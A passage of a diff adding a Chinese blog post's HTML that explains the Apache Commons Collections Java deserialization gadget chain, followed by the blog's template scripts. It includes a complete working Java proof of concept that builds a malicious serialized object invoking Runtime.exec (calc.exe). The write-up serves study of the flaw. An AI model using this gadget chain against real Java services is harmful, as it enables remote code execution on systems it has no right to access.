+        &#125;
+
+        UnsafeAccessor.setType(this, t);
+        UnsafeAccessor.setMemberValues(this, mv);
+    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h3 id="总结思路："><a href="#总结思路：" class="headerlink" title="总结思路："></a>总结思路：</h3><pre class="line-numbers language-none"><code class="language-none">(1)我们找到一个AnnotationInvocationHandler，在他反序列化的时候会给一个map对象赋值,因为map中值进行了增加,因此自动调用了setValue(),setValue()又调用了checkSetValue(),checkSetValue()中调用了valueTransformer.transform(value);
+当value&#x3D;null，valueTransformer&#x3D;chainedTransformer数组，valueTransformer.transform相当于执行了chainedTransformer.transform;
+chainedTransformer.transform又会对数组元素的.transform进行遍历执行
+数组中四个元素分别为
+new ConstantTransformer(Runtime.class),
+&#x2F;&#x2F; 传入Runtime类对象 反射执行getMethod获得getRuntime方法
+
+new InvokerTransformer(
+&quot;getMethod&quot;,
+new Class[]&#123;String.class,Class[].class&#125;,
+new Object[]&#123;&quot;getRuntime&quot;,null&#125;
+),
+
+&#x2F;&#x2F; 传入getRuntime方法对象 反射执行invoke方法 得到Runtime实例
+new InvokerTransformer(&quot;invoke&quot;,
+new Class[] &#123;Object.class, Object[].class &#125;,
+new Object[] &#123;null, null &#125;
+),
+
+&#x2F;&#x2F; 传入Runtime实例 执行exec方法
+new InvokerTransformer(&quot;exec&quot;,
+new Class[] &#123;String.class &#125;,
+new Object[] &#123;&quot;Calc.exe&quot;&#125;)
+
+(2)为什么强调要在程序运行时或者说为什么要利用反射的机制?
+因为人家的服务器只有在运行时，我们才能访问。换句话说，我们只能接触到运行时的java环境(如果能修改源码的话就没这么多事了)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>POC</p>
+<pre class="line-numbers language-none"><code class="language-none">package com.wuya.apache;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.util.HashMap;
+import java.util.Map;
+
+&#x2F;**
+ * 封装为TransformedMap
+ *&#x2F;
+public class Poc &#123;
+    public static void main(String[] args) &#123;
+        try &#123;
+            Transformer[] transformers &#x3D; new Transformer[]&#123;
+                    &#x2F;&#x2F; 获得Runtime类对象
+                    new ConstantTransformer(Runtime.class),
+                    &#x2F;&#x2F; 传入Runtime类对象 反射执行getMethod获得getRuntime方法
+                    new InvokerTransformer(
+                            &quot;getMethod&quot;,
+                            new Class[]&#123;String.class, Class[].class&#125;,
+                            new Object[]&#123;&quot;getRuntime&quot;, null&#125;
+                    ),
+                    &#x2F;&#x2F; 传入getRuntime方法对象 反射执行invoke方法 得到Runtime实例
+                    new InvokerTransformer(&quot;invoke&quot;,
+                            new Class[]&#123;Object.class, Object[].class&#125;,
+                            new Object[]&#123;null, null&#125;
+                    ),
+                    &#x2F;&#x2F; 传入Runtime实例 执行exec方法
+                    new InvokerTransformer(&quot;exec&quot;,
+                            new Class[]&#123;String.class&#125;,
+                            new Object[]&#123;&quot;calc.exe&quot;&#125;)
+            &#125;;
+
+            ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);
+
+            Map innermap &#x3D; new HashMap();
+            innermap.put(&quot;value&quot;, &quot;value&quot;);
+            Map outermap &#x3D; TransformedMap.decorate(innermap, null, chainedTransformer);
+            &#x2F;&#x2F; 构造包含恶意map的AnnotationInvocationHandler对象
+            Class cl &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+            Constructor cst &#x3D; cl.getDeclaredConstructor(Class.class, Map.class);
+            cst.setAccessible(true);
+            Object exploitObj &#x3D; cst.newInstance(Target.class, outermap);
+
+            &#x2F;&#x2F; 序列化
+            FileOutputStream fos &#x3D; new FileOutputStream(&quot;payload.bin&quot;);
+            ObjectOutputStream oos &#x3D; new ObjectOutputStream(fos);
+            oos.writeObject(exploitObj);
+            oos.close();
+
+            &#x2F;&#x2F; 反序列化
+            FileInputStream fis &#x3D; new FileInputStream(&quot;payload.bin&quot;);
+            ObjectInputStream ois &#x3D; new ObjectInputStream(fis);
+            Object result &#x3D; ois.readObject();
+            ois.close();
+            System.out.println(result);
+
+        &#125; catch (Exception e) &#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">Class cl &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+&#x2F;&#x2F;指定包的名称,利用反射来实例化对象
+
+Constructor cst &#x3D; cl.getDeclaredConstructor(Class.class, Map.class);
+getDeclaredConstructor()返回指定参数类型的private和public构造器。
+对于getDeclaredConstructor方法获得的构造器需要先设置可访问，再实例化对象。
+
+cst.setAccessible(true);就是设置可访问
+
+Object exploitObj &#x3D; cst.newInstance(Target.class, outermap);实例化对象
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="/jcxj/2022/09/30/apache-commons-collections-fan-xu-lie-hua-lou-dong/image-20221002153443521.png" class="" title="image-20221002153443521">
+
+
+
+
+
+
+
+
+
+
+
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        Author:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/jcxj/about" rel="external nofollow noreferrer">jcxj</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        Link:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://jcxj.github.io/jcxj/jcxj/2022/09/30/apache-commons-collections-fan-xu-lie-hua-lou-dong/">https://jcxj.github.io/jcxj/jcxj/2022/09/30/apache-commons-collections-fan-xu-lie-hua-lou-dong/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        Reprint policy:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    All articles in this blog are used except for special statements
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    reprint polocy. If reproduced, please indicate source
+                    <a href="/jcxj/about" target="_blank">jcxj</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/jcxj/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                                    <span class="chip bg-color">反序列化</span>
+                                </a>
+                            
+                                <a href="/jcxj/tags/Apache%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                                    <span class="chip bg-color">Apache反序列化</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/jcxj/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/jcxj/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">有没有好心人(dayuanzhong)v_me_50</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/jcxj/medias/reward/alipay1.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/jcxj/medias/reward/wechat1.jpg" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+    <div class="livere-card card" data-aos="fade-up">
+    <!-- 来必力City版安装代码 -->
+    <div id="lv-container" class="card-content" data-id="city" data-uid="">
+        <script type="text/javascript">
+            (function (d, s) {
+                let j, e = d.getElementsByTagName(s)[0];
+                if (typeof LivereTower === 'function') {
+                    return;
+                }
+
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript。</noscript>
+    </div>
+    <!-- City版安装代码已完成 -->
+</div>
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+            <div class="card">
+                <a href="/jcxj/2022/10/02/ssrf-fa-bao/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/jcxj/medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        
+                        <span class="card-title"></span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-10-02
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            jcxj
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/jcxj/2022/09/30/zen-me-zai-zi-ji-wang-zhan-shang-bu-shu-hexo-bo-ke/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/jcxj/medias/featureimages/3.jpg" class="responsive-img" alt="怎么在自己网站上部署hexo博客">
+                        
+                        <span class="card-title">怎么在自己网站上部署hexo博客</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-09-30
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/jcxj/categories/hexo/" class="post-category">
+                                    hexo
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/jcxj/tags/%E8%A7%A3%E5%86%B3%E9%97%AE%E9%A2%98/">
+                        <span class="chip bg-color">解决问题</span>
+                    </a>
+                    
+                    <a href="/jcxj/tags/hexo/">
+                        <span class="chip bg-color">hexo</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + 'From: Made by jcxj<br />'
+            + 'Author: jcxj<br />'
+            + 'Link: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归jcxj所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/jcxj/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/jcxj/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/jcxj/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/jcxj/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2022</span>
+            
+            <span id="year">2022</span>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">15.3k</span>&nbsp;字
+            
+            
+            
+            
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2022";
+                    var startMonth = "09";
+                    var startDate = "20";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link ">
+    <a href="https://github.com/jcxj/jcxj" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:971748776@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=971748776" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 971748776" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/jcxj/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/jcxj/libs/materialize/materialize.min.js"></script>
+    <script src="/jcxj/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/jcxj/libs/aos/aos.js"></script>
+    <script src="/jcxj/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/jcxj/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/jcxj/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/jcxj/libs/others/clicklove.js" async="async"></script>
+    
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="/jcxj/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
+<script type="text/javascript"> var OriginTitile = document.title, st;
+document.addEventListener("visibilitychange", function () { document.hidden ? (document.title = "问题没解决?", clearTimeout(st)) : (document.title = "Made by jcxj", st = setTimeout(function () { document.title = OriginTitile }, 3e3)) }) </script>
+
